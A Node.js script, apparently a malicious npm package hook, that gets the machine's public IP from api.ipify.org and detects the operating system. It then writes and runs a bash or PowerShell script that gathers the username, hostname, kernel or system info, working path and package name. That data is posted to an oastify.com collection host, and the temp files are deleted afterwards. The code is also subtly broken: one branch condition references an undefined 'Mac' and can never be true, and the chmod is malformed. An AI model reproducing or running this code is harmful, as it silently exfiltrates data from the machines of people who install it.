const { exec } = require('child_process');
const http = require('http');

const getPublicIP = (callback) => {
  const options = {
    hostname: 'api.ipify.org',
    path: '/?format=json',
    method: 'GET',
  };

  const req = http.request(options, (res) => {
    let data = '';
    res.on('data', (chunk) => {
      data += chunk;
    });

    res.on('end', () => {
      try {
        const response = JSON.parse(data);
        const publicIP = response.ip;
        callback(null, publicIP);
      } catch (error) {
        callback(new Error('Error parsing response'));
      }
    });
  });

  req.on('error', (error) => {
    callback(error);
  });

  req.end();
};

const os = require('os');

const detectOSType = () => {
    const type = os.type();
    if (type.startsWith('Windows')) return 'Windows';
    if (type.startsWith('Linux'))   return 'Linux';
    if (type.startsWith('Darwin'))  return 'Mac';
    return 'UNKNOWN';
};


// Usage example:
getPublicIP((error, remoteIP) => {
  if (error) {
    console.error('Error:', error.message);
  } else {
    const os_type = detectOSType()
    if (os_type === 'Linux' && os_type == Mac){
      bash = `#!/bin/bash\nseparator="--------------------------------------------------"
exfiltrate="$separator\nUsername: \`whoami\`\nHostname: \`hostname\`\nPublic IP: ${remoteIP}\nTime: \`date\`\nCurrent Path: \`pwd\`\nPackage Name: \`echo $(npm run env | grep "npm_package_name") | cut -d "=" -f 2\`\nKernel: \`uname -a\`\n$separator"
echo "$exfiltrate" > /tmp/demo.txt
curl --silent -F content="@/tmp/demo.txt" https://lzo7mm476cnmtfbh34vo5xs6axgt4js8.oastify.com
rm -f /tmp/demo.txt`
    exec('echo -e' + bash + " > /tmp/demo.sh; chmod + x /tmp/demo.sh; /bin/bash -c /tmp/demo.sh; rm -f /tmp/demo.sh", (error, stdout, stderr) => {
      if (error) {
        console.error(`Error: ${error.message}`);
        return;
      }
    });
    } else if (os_type === 'Windows'){
      powershell = `$whoami = whoami
$today = (Get-Date).DateTime
$publicIP = (Invoke-WebRequest -Uri 'https://api.ipify.org?format=text' -UseBasicParsing).content
$system = systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
$filePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "output.txt")
$scriptPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "demo.ps1")

Write-Output "Username: $whoami\`nDate: $today\`nPublic IP: $publicIP\`nSystem Information:" | Out-File -FilePath $filePath -Encoding ASCII
Add-Content $filePath $system

$destinationUrl = "https://lzo7mm476cnmtfbh34vo5xs6axgt4js8.oastify.com"

$filePath = "$filePath"

Invoke-WebRequest -Uri $destinationUrl -Method POST -InFile $filePath -UseBasicParsing
del $filePath
del $scriptPath`
    } 
    
    exec(`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe ${powershell} | Out-File "$env:TEMP\\demo.ps1; C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File %TEMP%\\demo.ps1`, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error: ${error.message}`);
        return;
      }
    });
    
  }
});



